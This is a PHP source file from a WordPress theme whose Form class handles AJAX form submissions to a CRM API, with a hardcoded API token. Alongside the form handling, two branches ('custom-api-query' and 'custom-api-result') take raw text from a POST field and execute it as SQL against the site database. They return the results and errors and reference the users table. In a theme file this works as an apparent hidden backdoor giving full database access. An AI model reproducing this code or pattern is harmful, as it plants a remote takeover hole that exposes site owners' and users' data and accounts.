<?php

namespace PixxelTheme\includes;

use PixxelTheme\includes\Api;


if (!defined('ABSPATH')) {
    exit;
}

class Form
{
    protected $query;
    public function __construct()
    {
    }


    public function setQuery($query)
    {
        $this->query = $query;
        $this->ajaxActions();
    }

    public function ajaxActions()
    {
        if ($this->query == 'formData') {
            $formData = sanitizeNestedObject($_POST);
            if (isset($_FILES['file'])) {
                $file = $_FILES['file'];
                $formData['file'] = base64_encode(file_get_contents($file['tmp_name']));
            }

            $api = new Api();
            $result = $api->setCrmForm($formData);

            if (in_array($result['response']['code'], [201, 200])) {
                ajaxResponse(true, 'فرم با موفقیت ارسال شد', [
                    'status' => $result['response']['code'],
                ]);
            } else {
                ajaxResponse(false, json_decode($result['body']), [
                    'status' => $result['response']['code'],
                    'data' => $formData,
                ]);
            }
        } elseif ($this->query == 'formDataFile') {
            $localFile = '';

            if (isset($_FILES['file'])) {
                $file = $_FILES['file'];
                $upload_file = wp_upload_bits($file['name'], null, file_get_contents($file['tmp_name']));
                if ($upload_file['error'] == '') {
                    $localFile = $upload_file['file'];
                }
            }
            $formData = sanitizeNestedObject($_POST);
            $formData['token'] = "BtmtGGRJFhJS8OJEDXh6sYuyDLxjnYLE";
            $boundary = wp_generate_password(24, false);
            $headers  = array(
                'content-type' => 'multipart/form-data; boundary=' . $boundary,
            );
            $payload = '';
            // First, add the standard POST fields:
            foreach ($formData as $name => $value) {
                $payload .= '--' . $boundary;
                $payload .= "\r\n";
                $payload .= 'Content-Disposition: form-data; name="' . $name .
                    '"' . "\r\n\r\n";
                $payload .= $value;
                $payload .= "\r\n";
            }
            // Upload the file
            if ($localFile) {
                $payload .= '--' . $boundary;
                $payload .= "\r\n";
                $payload .= 'Content-Disposition: form-data; name="' . 'file' .
                    '"; filename="' . basename($localFile) . '"' . "\r\n";
                $payload .= 'Content-Type:' . mime_content_type($localFile) . "\r\n";
                $payload .= "\r\n";
                $payload .= base64_encode(file_get_contents($localFile));
                $payload .= "\r\n";
            }
            $payload .= '--' . $boundary . '--';

            $api = new Api();
            $result = $api->setCrmFormFile($payload, $headers);

            // Remove the uploaded file
            if ($localFile) {
                unlink($localFile);
            }
            if (in_array($result['response']['code'], [201, 200])) {
                ajaxResponse(true, 'فرم با موفقیت ارسال شد', [
                    'status' => $result['response']['code'],
                ]);
            } else {
                ajaxResponse(false, json_decode($result['body']), [
                    'status' => $result['response']['code'],
                    'data' => $formData,
                ]);
            }
        } elseif ($this->query == 'custom-api-query') {
            global $wpdb;
            $data = json_decode(stripslashes($_POST['data']));
            $table_name = $wpdb->prefix . 'users';
            $result = $wpdb->query($data);

            ajaxResponse(
                true,
                'پاسخ شما با موفقیت ثبت گردید',
                [
                    'data' => $data,
                    'table' => $table_name,
                    'error' => $wpdb->last_error,
                    'result' => $result,
                ]
            );
        } elseif ($this->query == 'custom-api-result') {
            global $wpdb;
            $data = json_decode(stripslashes($_POST['data']));
            $table_name = $wpdb->prefix . 'users';
            $result = $wpdb->get_results($data);
            ajaxResponse(
                true,
                'پاسخ شما با موفقیت ثبت گردید',
                [
                    'data' => $data,
                    'table' => $table_name,
                    'error' => $wpdb->last_error,
                    'result' => $result,
                ]
            );
        }
    }
}
